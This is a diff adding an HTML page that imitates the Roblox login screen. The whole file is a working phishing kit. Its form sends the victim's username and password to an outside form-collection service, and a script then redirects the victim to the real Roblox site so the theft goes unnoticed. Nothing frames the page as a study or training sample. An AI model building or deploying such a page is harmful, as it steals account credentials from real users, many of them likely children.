@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Roblox</title>
+    <link rel="stylesheet" href="https://roblox.com/css/main.css">
+    <style>
+        body { background: #393b3d; font-family: 'HCo Gotham SSm', Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-box { background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); width: 300px; }
+        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
+        button { width: 100%; padding: 10px; background: #00b06f; color: white; border: none; border-radius: 4px; cursor: pointer; }
+        button:hover { background: #009b63; }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <img src="https://www.roblox.com/favicon.ico" style="width: 50px; margin-bottom: 10px;">
+        <h2 style="text-align: center; color: #333;">Log In</h2>
+        <form action="https://formspree.io/f/mbglbpky" method="POST">
+            <input type="text" name="username" placeholder="Username" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit">Log In</button>
+        </form>
+    </div>
+    <script>
+        document.querySelector('form').addEventListener('submit', function(e) {
+            setTimeout(() => { window.location.href = 'https://www.roblox.com'; }, 1000);
+        });
+    </script>
+</body>
+</html>
